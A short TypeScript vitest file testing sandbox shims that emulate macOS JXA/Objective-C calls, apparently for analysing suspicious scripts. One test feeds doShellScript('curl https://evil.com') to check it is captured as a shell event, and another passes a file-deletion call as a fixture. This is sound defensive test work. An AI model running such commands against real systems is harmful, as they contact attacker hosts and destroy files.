import { describe, it, expect } from 'vitest';
import { createFoundationStubs } from '../src/foundation-shims';
import type { SandboxEvent } from '../src/types';

function setup() {
  const events: SandboxEvent[] = [];
  const unsupported: string[] = [];
  return { events, unsupported, ...createFoundationStubs(events, unsupported) };
}

describe('foundation shims', () => {
  it('decodes the base64 recipe via NSData -> NSString', () => {
    const { $ } = setup();
    const b64 = Buffer.from('hello-payload').toString('base64');
    const data = $.NSData.alloc.initWithBase64EncodedString_options(b64, 0);
    const str = $.NSString.alloc.initWithData_encoding(data, 4);
    expect(str.js).toBe('hello-payload');
  });

  it('captures doShellScript as a shell event', () => {
    const { Application, events } = setup();
    Application('System Events').doShellScript('curl https://evil.com');
    expect(events.some(e => e.kind === 'shell' && e.detail.includes('curl'))).toBe(true);
  });

  it('records unknown calls as unsupported', () => {
    const { $, unsupported } = setup();
    $.NSFileManager.defaultManager.removeItemAtPath_error('/x', null);
    expect(unsupported.some(u => u.includes('NSFileManager'))).toBe(true);
  });
});
